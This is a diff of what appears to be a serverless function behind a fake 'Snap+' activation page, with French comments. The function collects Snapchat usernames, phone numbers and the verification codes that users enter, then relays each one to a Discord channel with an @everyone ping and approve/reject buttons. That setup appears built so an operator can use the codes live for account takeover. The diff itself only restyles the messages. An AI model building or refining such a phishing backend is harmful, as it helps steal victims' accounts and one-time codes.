@@ -25,10 +25,9 @@ serve(async (req) => {
 
     const { username, phone, code, step, submissionId } = await req.json();
 
-    // Formater le numéro de téléphone avec espaces
+    // Formater le numéro de téléphone avec espaces (garde le 0)
     const formatPhone = (p: string) => {
-      const clean = p.replace(/^0/, '');
-      return clean.replace(/(\d{1})(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
+      return p.replace(/(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
     };
 
     // Si c'est le formulaire initial, créer une entrée
@@ -43,28 +42,11 @@ serve(async (req) => {
 
       const embed = {
         title: "📱 Nouvelle demande Snap+",
-        description: "Un utilisateur vient de soumettre une demande d'activation.",
-        color: 0xFFD700, // Or
-        thumbnail: {
-          url: "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png"
-        },
-        fields: [
-          { 
-            name: "👤 Nom d'utilisateur", 
-            value: `\`${username}\``, 
-            inline: true 
-          },
-          { 
-            name: "📞 Téléphone", 
-            value: `+33 ${formatPhone(phone)}`, 
-            inline: true 
-          },
-        ],
+        description: `👤 **Nom d'utilisateur:** ${username}\n\n📞 **Téléphone:** ${formatPhone(phone)}`,
+        color: 0xFFA500, // Orange
         footer: { 
-          text: "⏳ En attente du code de vérification...",
-          icon_url: "https://cdn-icons-png.flaticon.com/512/2972/2972531.png"
+          text: "⏳ En attente du code de vérification..."
         },
-        timestamp: new Date().toISOString(),
       };
 
       await fetch(`https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages`, {
@@ -73,7 +55,10 @@ serve(async (req) => {
           'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
           'Content-Type': 'application/json' 
         },
-        body: JSON.stringify({ embeds: [embed] }),
+        body: JSON.stringify({ 
+          content: "@everyone",
+          embeds: [embed] 
+        }),
       });
 
       return new Response(JSON.stringify({ success: true, submissionId: data.id }), {
@@ -100,61 +85,35 @@ serve(async (req) => {
         second: '2-digit' 
       });
 
+      // Style exactement comme l'image
       const embed = {
         title: "🔐 Code de vérification soumis",
-        color: 0xFFD700, // Or
-        thumbnail: {
-          url: "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png"
-        },
-        fields: [
-          { 
-            name: "👤 Nom d'utilisateur", 
-            value: `\`${username}\``, 
-            inline: false 
-          },
-          { 
-            name: "🔢 Code saisi", 
-            value: `\`\`\`${code}\`\`\``, 
-            inline: true 
-          },
-          { 
-            name: "📞 Téléphone", 
-            value: `+33 ${formatPhone(phone)}`, 
-            inline: true 
-          },
-          { 
-            name: "📅 Soumis le", 
-            value: `${dateStr} à ${timeStr}`, 
-            inline: false 
-          },
-        ],
+        description: `👤 **Nom d'utilisateur:** ${username}\n\n🔢 **Code saisi:** \`${code}\`\n\n📞 **Téléphone:** ${formatPhone(phone)}\n\n📅 **Soumis à:** ${dateStr} ${timeStr}`,
+        color: 0xFFA500, // Orange comme l'image
         footer: { 
-          text: "⏳ En attente de validation par un modérateur",
-          icon_url: "https://cdn-icons-png.flaticon.com/512/1828/1828640.png"
+          text: "En attente de validation par un modérateur"
         },
-        timestamp: new Date().toISOString(),
       };
 
-      // Message avec VRAIS boutons interactifs
+      // Message avec @everyone et boutons
       const payload = {
+        content: "@everyone",
         embeds: [embed],
         components: [
           {
-            type: 1, // Action Row
+            type: 1,
             components: [
               {
-                type: 2, // Button
-                style: 3, // Green (Success)
+                type: 2,
+                style: 3, // Vert
                 label: "Accepter",
                 custom_id: `approve_${submissionId}`,
-                emoji: { name: "✅" }
               },
               {
-                type: 2, // Button
-                style: 4, // Red (Danger)
+                type: 2,
+                style: 4, // Rouge
                 label: "Refuser",
                 custom_id: `reject_${submissionId}`,
-                emoji: { name: "❌" }
               }
             ]
           }
